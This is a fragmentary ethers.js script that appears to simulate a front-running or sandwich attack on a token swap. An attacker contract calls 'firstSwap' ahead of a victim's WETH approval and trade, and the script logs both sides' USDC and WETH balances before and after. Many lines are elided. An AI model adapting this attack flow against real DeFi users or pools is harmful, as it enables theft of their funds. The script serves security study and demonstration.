...
async function main() {
  ...
  const AttackerIndex = ethers.solidityPackedKeccak256(
    ["uint256", "uint256"],
    [maliciousContract, 3]
  ); // key, slot
  ...
  const VictimIndex = ethers.solidityPackedKeccak256(
    ["uint256", "uint256"],
    [victim.address, 3]
  ); // key, slot
  ...
  console.log(
    ...
    ethers.getAddress(maliciousContract)
  );
  const attackerUSDCBalanceBefore = await attacker.getUSDCBalance(
    maliciousContract
  );
  const attackerWETHBalanceBefore = await attacker.getWETHBalance(
    maliciousContract
  );

  console.log(
    "USDC Balance Before (attacker) = ",
    BigInt(attackerUSDCBalanceBefore).toString()
  );
  console.log(
    "WETH Balance Before (attacker) = ",
    BigInt(attackerWETHBalanceBefore).toString()
  );
  ...
  console.log(
    "USDC Balance Before (victim) = ",
    BigInt(victimUSDCBalanceBefore).toString()
  );
  console.log(
    "WETH Balance Before (victim) = ",
    BigInt(victimWETHBalanceVictim).toString()
  );
  ///////////////////////////////////////////////////////////////////////////////////////////////////////
  ...
  const approveParams = [Router, BigInt(amount)];
  await victim.sendTransaction({
    to: WETH,
    data: IERC20Interface.encodeFunctionData(
      approveFunctionName,
      approveParams
    ),
  });
  ...
  await attacker.connect(maliciousUser).firstSwap(BigInt(amount), {
    gasLimit: 500000,
  ...
  ////// This Section of code responsible logging victim and attacker malicious contract balnace ////////
  ///////////////////////////////////////////////////////////////////////////////////////////////////////
  const attackerUSDCBalanceAfter = await attacker.getUSDCBalance(
    maliciousContract
  );
  const attackerWETHBalanceAfter = await attacker.getWETHBalance(
    maliciousContract
  );

  console.log(
    "USDC Balance After (attacker) = ",
    BigInt(attackerUSDCBalanceAfter).toString()
  );
  console.log(
    "WETH Balance After (attacker) = ",
    BigInt(attackerWETHBalanceAfter).toString()
  );
  ...
  console.log(
    "USDC Balance After (victim) = ",
    BigInt(victimUSDCBalanceAfter).toString()
  );
  console.log(
    "WETH Balance After (victim) = ",
    BigInt(victimWETHBalanceAfter).toString()
  );
  ///////////////////////////////////////////////////////////////////////////////////////////////////////
}
